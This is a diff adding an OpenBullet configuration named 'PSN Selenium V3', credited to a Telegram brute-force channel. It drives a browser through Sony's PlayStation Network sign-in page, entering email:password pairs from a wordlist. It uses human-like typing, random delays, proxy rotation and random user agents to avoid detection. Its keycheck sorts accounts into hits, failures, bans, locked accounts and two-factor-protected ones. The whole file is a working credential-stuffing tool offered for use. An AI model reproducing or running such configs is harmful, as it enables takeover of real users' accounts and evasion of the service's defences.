@@ -1,0 +1,91 @@
+[SETTINGS]
+{
+  "Name": "PSN Selenium V3",
+  "SuggestedBots": 10,
+  "MaxCPM": 0,
+  "LastModified": "2020-08-27T12:09:46.1888641+04:30",
+  "AdditionalInfo": "Telegram Channel: @BruteForce | Need HQ Proxy | Max Bot: 10 | You Should install Chorme Driver | Run Just OB 1.2.2 ",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": true,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": true,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": true,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": true,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#OPEN BROWSERACTION Open 
+
+NAVIGATE "https://id.sonyentertainmentnetwork.com/id/tv/signin/?/signin#/signin" 
+
+#KIR FUNCTION RandomNum "524" "648" -> VAR "KIR" 
+
+#Set BROWSERACTION SetWidth "<KIR>" 
+
+#RRR FUNCTION RandomNum "892" "1354" -> VAR "RRR" 
+
+#Delay FUNCTION Delay "<RRR>" -> VAR "Delay" 
+
+#Click ELEMENTACTION XPath "//*[@id=\"ember14\"]" 
+  Click 
+
+#Send ELEMENTACTION XPath "//*[@id=\"ember14\"]" 
+  SendKeysHuman "<USER>" 
+
+#RRRR FUNCTION RandomNum "892" "1354" -> VAR "RRRR" 
+
+#Delay FUNCTION Delay "<RRRR>" -> VAR "Delay" 
+
+#Click ELEMENTACTION XPath "//*[@id=\"ember17\"]" 
+  Click 
+
+#SendP ELEMENTACTION XPath "//*[@id=\"ember17\"]" 
+  SendKeysHuman "<PASS>" 
+
+#RRRRR FUNCTION RandomNum "892" "1354" -> VAR "RRRRR" 
+
+#Delay FUNCTION Delay "<RRRRR>" -> VAR "Delay" 
+
+#Enter BROWSERACTION SendKeys "<ENTER>" 
+
+#Delay FUNCTION Delay "500" -> VAR "Delay" 
+
+#Wait ELEMENTACTION Id "" 
+  WaitForElement "3s" 
+
+#DOM BROWSERACTION DOMtoSOURCE 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "An error occurred during communication with the server." 
+  KEYCHAIN Failure OR 
+    KEY "The sign-in ID (email address) or password is not correct." 
+  KEYCHAIN Ban OR 
+    KEY "The connection to the server timed out." 
+    KEY "A connection to the server could not be established." 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Either your account has been locked due to multiple failed sign-in attempts, or your password needs to be reset due to security reasons." 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "2-step verification is enabled." 
+
